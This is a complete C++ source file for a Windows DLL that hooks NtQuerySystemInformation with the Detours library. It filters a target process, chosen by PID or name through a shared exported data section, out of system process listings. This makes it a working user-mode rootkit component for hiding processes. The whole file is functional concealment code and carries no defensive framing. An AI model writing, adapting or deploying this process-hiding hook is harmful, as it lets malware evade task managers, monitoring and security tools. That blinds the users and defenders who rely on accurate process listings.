// dllmain.cpp : Defines the entry point for the DLL application.
#pragma warning(disable : 6387)  // Disable warning 6387
#pragma warning(disable : 28182)  // Disable warning 28182

#include "pch.h"

#define ENABLE_CONSOLE

#pragma data_seg("input")
__declspec(dllexport) DWORD TargetProcessPid = {0};
__declspec(dllexport) WCHAR TargetProcessName[32] = { 0 };
#pragma data_seg()
#pragma comment(linker,"/section:input,RWS")


decltype(::NtQuerySystemInformation)* OriginalNtQuerySystemInformation;

NTSTATUS NTAPI HookNtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
)
{
    printf("[+] ::NtQuerySystemInformation:: called!\n");

    auto status = OriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    if (SystemInformationClass != SystemProcessInformation)
    {
        return status;
    }

    if (TargetProcessPid == 0 && TargetProcessName[0] == 0)
    {
        return status;
    }

    auto currentProcessInfo = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
    SYSTEM_PROCESS_INFORMATION* previousProcessInfo = nullptr;
    
    for (;;)
    {
        if (previousProcessInfo)
        {
            if ((TargetProcessPid != 0 && TargetProcessPid == HandleToULong(currentProcessInfo->UniqueProcessId)) ||
                (TargetProcessName[0] && (_wcsnicmp(TargetProcessName, currentProcessInfo->ImageName.Buffer, (currentProcessInfo->ImageName.Length / sizeof(WCHAR))) == 0))
                )
            {
                previousProcessInfo->NextEntryOffset += currentProcessInfo->NextEntryOffset;
            }
            else
            {
                previousProcessInfo = currentProcessInfo;
            }
        }
        else
        {
            previousProcessInfo = currentProcessInfo;

        }

        if (currentProcessInfo->NextEntryOffset == 0) {
            break;
        }
        currentProcessInfo = (SYSTEM_PROCESS_INFORMATION*)((PBYTE)currentProcessInfo + currentProcessInfo->NextEntryOffset);
        printf("ImageName: %ws\n", currentProcessInfo->ImageName.Buffer);

    }

    return status;

}


bool InstallHooks()
{
    printf("[+] ::InstallHooks:: start!\n");
    OriginalNtQuerySystemInformation = (decltype(::NtQuerySystemInformation)*)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    printf("[+] ::InstallHooks:: original NtQuerySystemInformation address: 0x%p!\n", OriginalNtQuerySystemInformation);

    DetourTransactionBegin();
    DetourAttach((PVOID*)&OriginalNtQuerySystemInformation, HookNtQuerySystemInformation);
    return ERROR_SUCCESS == DetourTransactionCommit();
}

bool UnInstallHooks()
{
    printf("[+] ::UnInstallHooks:: unstalled hooks!\n");
    DetourTransactionBegin();
    DetourDetach((PVOID*)&OriginalNtQuerySystemInformation, HookNtQuerySystemInformation);
    return ERROR_SUCCESS == DetourTransactionCommit();
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
#ifdef ENABLE_CONSOLE

        AllocConsole();
        FILE* f;
        freopen_s(&f, "CONOUT$", "w", stdout);
#else
#endif
        return InstallHooks();
    case DLL_PROCESS_DETACH:

#ifdef ENABLE_CONSOLE
        FreeConsole();
#else
#endif
        return UnInstallHooks();
    }
    return TRUE;
}

